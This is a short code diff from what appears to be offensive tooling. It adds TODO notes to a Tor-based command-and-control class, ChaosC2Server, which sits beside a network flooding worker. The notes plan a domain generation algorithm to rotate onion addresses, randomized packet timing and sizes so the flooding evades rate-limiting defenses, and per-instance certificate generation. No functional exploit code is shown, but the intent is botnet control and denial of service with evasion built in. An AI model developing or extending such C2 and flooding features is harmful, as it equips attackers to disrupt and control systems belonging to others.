@@ -95,6 +95,13 @@ def network_chaos_worker():
 
 # Tor-based Dynamic C2 Server
 class ChaosC2Server:
+    """
+    TODO: 
+    Add DGA: Implement a simple DGA in ChaosC2Server to rotate onion addresses.
+    Improve Flooding: Randomize packet timing and sizes in network_chaos_worker to evade rate-limiting defenses.
+    Secure Tor: Generate fresh .crt and .key files dynamically for each C2 instance.
+    """
+    
     def __init__(self):
         self.tor = TorClient()
         self.onion_addr = None
